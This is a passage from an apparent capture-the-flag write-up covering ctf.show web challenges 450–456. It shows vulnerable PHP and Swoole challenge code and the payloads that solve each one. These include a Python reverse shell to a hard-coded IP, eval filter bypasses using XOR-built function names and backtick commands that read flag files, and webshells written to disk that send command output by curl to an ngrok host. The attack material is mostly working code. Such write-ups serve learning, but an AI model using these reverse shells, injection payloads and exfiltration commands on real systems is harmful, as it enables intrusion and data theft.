php"><table><tr><td class="code"><pre><span class="line">get:POST=import socket,subprocess,os;s=socket.<span class="title function_ invoke__">socket</span>(socket.AF_INET,socket.SOCK_STREAM);s.<span class="title function_ invoke__">connect</span>((<span class="string">&quot;174.0.13.43&quot;</span>,<span class="number">1234</span>));os.<span class="title function_ invoke__">dup2</span>(s.<span class="title function_ invoke__">fileno</span>(),<span class="number">0</span>);os.<span class="title function_ invoke__">dup2</span>(s.<span class="title function_ invoke__">fileno</span>(),<span class="number">1</span>); os.<span class="title function_ invoke__">dup2</span>(s.<span class="title function_ invoke__">fileno</span>(),<span class="number">2</span>);p=subprocess.<span class="title function_ invoke__">call</span>([<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-i&quot;</span>]);</span><br><span class="line"></span><br><span class="line">code=<span class="title function_ invoke__">str</span>(<span class="title function_ invoke__">exec</span>(<span class="title function_ invoke__">globals</span>()[<span class="keyword">list</span>(<span class="title function_ invoke__">globals</span>().<span class="title function_ invoke__">keys</span>())[True-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)]].args.<span class="title function_ invoke__">get</span>(<span class="title function_ invoke__">globals</span>()[<span class="keyword">list</span>(<span class="title function_ invoke__">globals</span>().<span class="title function_ invoke__">keys</span>())[True-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)]].method)))</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="web450"><a href="#web450" class="headerlink" title="web450"></a>web450</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-02-03 22:57:52</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-02-04 14:28:30</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$ctfshow</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;ctfshow&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-z]+[\^][a-z]+[\^][a-z]+$/&#x27;</span>, <span class="variable">$ctfshow</span>))&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;(<span class="subst">$ctfshow</span>)();&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Notice: Undefined index: ctfshow in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">15</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?ctfshow=phpinfo^phpinfo^phpinfo</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> =  <span class="string">&#x27;phpanfo&#x27;</span>^<span class="string">&#x27;phpznfo&#x27;</span>^<span class="string">&#x27;phprnfo&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;a&#x27;</span>^<span class="string">&#x27;z&#x27;</span>^<span class="string">&#x27;r&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="comment">#phpinfo</span></span><br><span class="line"><span class="comment">#i</span></span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220415162912608.png" alt="image-20220415162912608"></p><h1 id="web451"><a href="#web451" class="headerlink" title="web451"></a>web451</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-02-03 22:57:52</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-02-04 15:38:05</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$ctfshow</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;ctfshow&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-z]+[\^][a-z]+[\^][a-z]+$/&#x27;</span>, <span class="variable">$ctfshow</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/phpinfo/&#x27;</span>, <span class="variable">$ctfshow</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&quot;(<span class="subst">$ctfshow</span>)();&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Notice: Undefined index: ctfshow in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">15</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?ctfshow=phpanfo^phpznfo^phprnfo</span><br></pre></td></tr></table></figure><h1 id="web452"><a href="#web452" class="headerlink" title="web452"></a>web452</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-02-03 22:57:52</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-02-04 16:05:23</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$ctfshow</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;ctfshow&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\&#x27;|\&quot;|[0-9]|\&#123;|\[|\~|\^|phpinfo|\$/i&#x27;</span>, <span class="variable">$ctfshow</span>))&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$ctfshow</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?ctfshow=<span class="keyword">echo</span> `cat /f*`;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?ctfshow=((p).(h).(p).(i).(n).(f).(o))();</span><br></pre></td></tr></table></figure><h1 id="web453"><a href="#web453" class="headerlink" title="web453"></a>web453</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220415163540538.png" alt="image-20220415163540538"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220415163659803.png" alt="image-20220415163659803"></p><p>index.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-02-04 22:43:04</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-02-05 02:03:03</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$http</span> = <span class="keyword">new</span> Swoole\Http\<span class="title function_ invoke__">Server</span>(<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">80</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$http</span>-&gt;<span class="title function_ invoke__">on</span>(<span class="string">&#x27;start&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$server</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Swoole http server is started at http://0.0.0.0:80\n&quot;</span>;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable">$http</span>-&gt;<span class="title function_ invoke__">on</span>(<span class="string">&#x27;request&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$request</span>, <span class="variable">$response</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">list</span>(<span class="variable">$controller</span>, <span class="variable">$action</span>) = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;/&#x27;</span>, <span class="title function_ invoke__">trim</span>(<span class="variable">$request</span>-&gt;server[<span class="string">&#x27;request_uri&#x27;</span>], <span class="string">&#x27;/&#x27;</span>));</span><br><span class="line">    <span class="variable">$route</span> = <span class="keyword">array</span>(<span class="string">&#x27;ctf&#x27;</span>);</span><br><span class="line">    <span class="variable">$method</span> = <span class="keyword">array</span>(<span class="string">&#x27;show&#x27;</span>,<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;exec&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$controller</span>, <span class="variable">$route</span>) &amp;&amp; <span class="title function_ invoke__">in_array</span>(<span class="variable">$action</span>, <span class="variable">$method</span>))&#123;</span><br><span class="line">    (<span class="keyword">new</span> <span class="variable">$controller</span>)-&gt;<span class="variable">$action</span>(<span class="variable">$request</span>, <span class="variable">$response</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">     <span class="variable">$response</span>-&gt;<span class="title function_ invoke__">end</span>(<span class="string">&#x27;&lt;h3&gt;where is flag?&lt;/h3&gt;&lt;!--/ctf/show?s=XXX  file_get_contents($_POST[\&#x27;s\&#x27;])--&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;);</span><br><span class="line"><span class="variable">$http</span>-&gt;<span class="title function_ invoke__">start</span>();</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctf</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"><span class="variable">$request</span>,<span class="variable">$response</span></span>)</span>&#123;</span><br><span class="line"> <span class="variable">$response</span>-&gt;<span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/html; charset=utf-8&#x27;</span>);</span><br><span class="line"> <span class="variable">$s</span>=<span class="variable">$request</span>-&gt;post[<span class="string">&#x27;s&#x27;</span>];</span><br><span class="line"> <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$s</span>))&#123;</span><br><span class="line"> <span class="variable">$response</span>-&gt;<span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$s</span>));</span><br><span class="line"> &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"> <span class="variable">$response</span>-&gt;<span class="title function_ invoke__">end</span>(<span class="string">&#x27;s not found&#x27;</span>);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file</span>(<span class="params"><span class="variable">$request</span>,<span class="variable">$response</span></span>)</span>&#123;</span><br><span class="line">  <span class="variable">$response</span>-&gt;<span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/html; charset=utf-8&#x27;</span>);</span><br><span class="line"> <span class="variable">$s</span>=<span class="variable">$request</span>-&gt;post[<span class="string">&#x27;s&#x27;</span>];</span><br><span class="line"> <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$s</span>))&#123;</span><br><span class="line"> <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;shell.php&#x27;</span>, <span class="variable">$s</span>);</span><br><span class="line"> <span class="variable">$response</span>-&gt;<span class="title function_ invoke__">end</span>(<span class="string">&#x27;file write done in /var/www/shell.php&#x27;</span>);</span><br><span class="line"> &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"> <span class="variable">$response</span>-&gt;<span class="title function_ invoke__">end</span>(<span class="string">&#x27;s not found&#x27;</span>);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">exec</span>(<span class="params"><span class="variable">$request</span>,<span class="variable">$response</span></span>)</span>&#123;</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&#x27;php shell.php&#x27;</span>);</span><br><span class="line"><span class="variable">$response</span>-&gt;<span class="title function_ invoke__">end</span>(<span class="string">&#x27;command exec done&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>当我们访问&#x2F;ctf&#x2F;file post传入的s会写入shell.php中，然后当我们访问&#x2F;ctf&#x2F;exec时，就会去执行刚才的shell.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//d19ab105-9db8-47bd-8ef4-72f1f35bbd19.challenge.ctf.show/ctf/file</span></span><br><span class="line">POST</span><br><span class="line">s=<span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;curl http://b423-111-17-194-91.ngrok.io?1=`ls`&#x27;</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220415173649654.png" alt="image-20220415173649654"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//d19ab105-9db8-47bd-8ef4-72f1f35bbd19.challenge.ctf.show/ctf/exec</span></span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220415173726802.png" alt="image-20220415173726802"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//d19ab105-9db8-47bd-8ef4-72f1f35bbd19.challenge.ctf.show/ctf/file</span></span><br><span class="line">POST</span><br><span class="line">s=<span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;curl http://b423-111-17-194-91.ngrok.io?1=`cat flaaag`&#x27;</span>); <span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"> http:<span class="comment">//d19ab105-9db8-47bd-8ef4-72f1f35bbd19.challenge.ctf.show/ctf/exec   </span></span><br></pre></td></tr></table></figure><h1 id="web454"><a href="#web454" class="headerlink" title="web454"></a>web454</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-02-04 22:43:04</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-02-05 03:36:52</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$http</span> = <span class="keyword">new</span> Swoole\Http\<span class="title function_ invoke__">Server</span>(<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">80</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$http</span>-&gt;<span class="title function_ invoke__">on</span>(<span class="string">&#x27;start&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$server</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Swoole http server is started at http://0.0.0.0:80\n&quot;</span>;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable">$http</span>-&gt;<span class="title function_ invoke__">on</span>(<span class="string">&#x27;request&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$request</span>, <span class="variable">$response</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">list</span>(<span class="variable">$controller</span>, <span class="variable">$action</span>) = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;/&#x27;</span>, <span class="title function_ invoke__">trim</span>(<span class="variable">$request</span>-&gt;server[<span class="string">&#x27;request_uri&#x27;</span>], <span class="string">&#x27;/&#x27;</span>));</span><br><span class="line">    <span class="variable">$route</span> = <span class="keyword">array</span>(<span class="string">&#x27;ctf&#x27;</span>);</span><br><span class="line">    <span class="variable">$method</span> = <span class="keyword">array</span>(<span class="string">&#x27;show&#x27;</span>,<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;include&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$controller</span>, <span class="variable">$route</span>) &amp;&amp; <span class="title function_ invoke__">in_array</span>(<span class="variable">$action</span>, <span class="variable">$method</span>))&#123;</span><br><span class="line">    (<span class="keyword">new</span> <span class="variable">$controller</span>)-&gt;<span class="variable">$action</span>(<span class="variable">$request</span>, <span class="variable">$response</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">     <span class="variable">$response</span>-&gt;<span class="title function_ invoke__">end</span>(<span class="string">&#x27;&lt;h3&gt;where is flag?&lt;/h3&gt;&lt;!--/ctf/show?s=XXX  file_get_contents($_POST[\&#x27;s\&#x27;])--&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;);</span><br><span class="line"><span class="variable">$http</span>-&gt;<span class="title function_ invoke__">start</span>();</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctf</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"><span class="variable">$request</span>,<span class="variable">$response</span></span>)</span>&#123;</span><br><span class="line"> <span class="variable">$response</span>-&gt;<span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/html; charset=utf-8&#x27;</span>);</span><br><span class="line"> <span class="variable">$s</span>=<span class="variable">$request</span>-&gt;post[<span class="string">&#x27;s&#x27;</span>];</span><br><span class="line"> <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$s</span>))&#123;</span><br><span class="line"> <span class="variable">$response</span>-&gt;<span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$s</span>));</span><br><span class="line"> &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"> <span class="variable">$response</span>-&gt;<span class="title function_ invoke__">end</span>(<span class="string">&#x27;s not found&#x27;</span>);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file</span>(<span class="params"><span class="variable">$request</span>,<span class="variable">$response</span></span>)</span>&#123;</span><br><span class="line">  <span class="variable">$response</span>-&gt;<span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/html; charset=utf-8&#x27;</span>);</span><br><span class="line"> <span class="variable">$s</span>=<span class="variable">$request</span>-&gt;post[<span class="string">&#x27;s&#x27;</span>];</span><br><span class="line"> <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$s</span>))&#123;</span><br><span class="line"> <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;shell.php&#x27;</span>, <span class="variable">$s</span>);</span><br><span class="line"> <span class="variable">$response</span>-&gt;<span class="title function_ invoke__">end</span>(<span class="string">&#x27;file write done in /var/www/shell.php&#x27;</span>);</span><br><span class="line"> &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"> <span class="variable">$response</span>-&gt;<span class="title function_ invoke__">end</span>(<span class="string">&#x27;s not found&#x27;</span>);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">include</span>(<span class="params"><span class="variable">$request</span>,<span class="variable">$response</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;shell.php&#x27;</span>);</span><br><span class="line"><span class="variable">$response</span>-&gt;<span class="title function_ invoke__">end</span>(<span class="string">&#x27;include done&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//1a1b05f6-a873-4664-9c86-947cfdad9243.challenge.ctf.show/ctf/file</span></span><br><span class="line">POST</span><br><span class="line">s=<span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;curl http://b423-111-17-194-91.ngrok.io?1=`ls`&#x27;</span>); <span class="meta">?&gt;</span></span><br><span class="line">http:<span class="comment">//1a1b05f6-a873-4664-9c86-947cfdad9243.challenge.ctf.show/ctf/include</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//1a1b05f6-a873-4664-9c86-947cfdad9243.challenge.ctf.show//ctf/file</span></span><br><span class="line">POST</span><br><span class="line">s=<span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;curl http://b423-111-17-194-91.ngrok.io?1=`cat flaaags`&#x27;</span>); <span class="meta">?&gt;</span></span><br><span class="line">http:<span class="comment">//1a1b05f6-a873-4664-9c86-947cfdad9243.challenge.ctf.show/ctf/include</span></span><br></pre></td></tr></table></figure><h1 id="web455-456"><a href="#web455-456" class="headerlink" title="web455-456"></a>web455-456</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-02-04 22:43:04</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-02-05 04:11:50</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$http</span> = <span class="keyword">new</span> Swoole\Http\<span class="title function_ invoke__">Server</span>(<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">80</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$http</span>-&gt;<span class="title function_ invoke__">on</span>(<span class="string">&#x27;start&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$server</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Swoole http server is started at http://0.0.0.0:80\n&quot;</span>;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable">$http</span>-&gt;<span class="title function_ invoke__">on</span>(<span class="string">&#x27;request&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$request</span>, <span class="variable">$response</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">list</span>(<span class="variable">$controller</span>, <span class="variable">$action</span>) = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;/&#x27;</span>, <span class="title function_ invoke__">trim</span>(<span class="variable">$request</span>-&gt;server[<span class="string">&#x27;request_uri&#x27;</span>], <span class="string">&#x27;/&#x27;</span>));</span><br><span class="line">    <span class="variable">$route</span> = <span class="keyword">array</span>(<span class="string">&#x27;ctf&#x27;</span>);</span><br><span class="line">    <span class="variable">$method</span> = <span class="keyword">array</span>(<span class="string">&#x27;show&#x27;</span>,<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;exec&#x27;</span>,<span class="string">&#x27;reload&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$controller</span>, <span class="variable">$route</span>) &amp;&amp; <span class="title function_ invoke__">in_array</span>(<span class="variable">$action</span>, <span class="variable">$method</span>))&#123;</span><br><span class="line">    (<span class="keyword">new</span> <span class="variable">$controller</span>)-&gt;<span class="variable">$action</span>(<span class="variable">$request</span>, <span class="variable">$response</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">     <span class="variable">$response</span>-&gt;<span class="title function_ invoke__">end</span>(<span class="string">&#x27;&lt;h3&gt;where is flag?&lt;/h3&gt;&lt;!--/ctf/show?s=XXX  file_get_contents($_POST[\&#x27;s\&#x27;])--&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;);</span><br><span class="line"><span class="variable">$http</span>-&gt;<span class="title function_ invoke__">start</span>();</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctf</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"><span class="variable">$request</span>,<span class="variable">$response</span></span>)</span>&#123;</span><br><span class="line"> <span class="variable">$response</span>-&gt;<span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/html; charset=utf-8&#x27;</span>);</span><br><span class="line"> <span class="variable">$s</span>=<span class="variable">$request</span>-&gt;post[<span class="string">&#x27;s&#x27;</span>];</span><br><span class="line"> <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$s</span>))&#123;</span><br><span class="line"> <span class="variable">$response</span>-&gt;<span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$s</span>));</span><br><span class="line"> &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"> <span class="variable">$response</span>-&gt;<span class="title function_ invoke__">end</span>(<span class="string">&#x27;s not found&#x27;</span>);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file</span>(<span class="params"><span class="variable">$request</span>,<span class="variable">$response</span></span>)</span>&#123;</span><br><span class="line">  <span class="variable">$response</span>-&gt;<span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/html; charset=utf-8&#x27;</span>);</span><br><span class="line"> <span class="variable">$s</span>=<span class="variable">$request</span>-&gt;post[<span class="string">&#x27;s&#x27;</span>];</span><br><span class="line"> <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$s</span>))&#123;</span><br><span class="line"> <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;shell.php&#x27;</span>, <span class="variable">$s</span>);</span><br><span class="line"> <span class="variable">$response</span>-&gt;<span class="title function_ invoke__">end</span>(<span class="string">&#x27;file write done in /var/www/shell.php&#x27;</span>);</span><br><span class="line"> &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"> <span class="variable">$response</span>-&gt;<span class="title function_ invoke__">end</span>(<span class="string">&#x27;s not found&#x27;</span>);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">exec</span>(<span class="params"><span class="variable">$request</span>,<span class="variable">$response</span></span>)</span>&#123;</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&#x27;php shell.php&#x27;</span>);</span><br><span class="line"><span class="variable">$response</span>-&gt;<span class="title function_ invoke__">end</span>(<span class="string">&#x27;include done&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">reload</span>(<span class="params"><span class="variable">$request</span>,<span class="variable">$response</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">global</span> <span class="variable">$http</span>;</span><br><span class="line"><span class="variable">$http</span>-&gt;<span class="title function_ 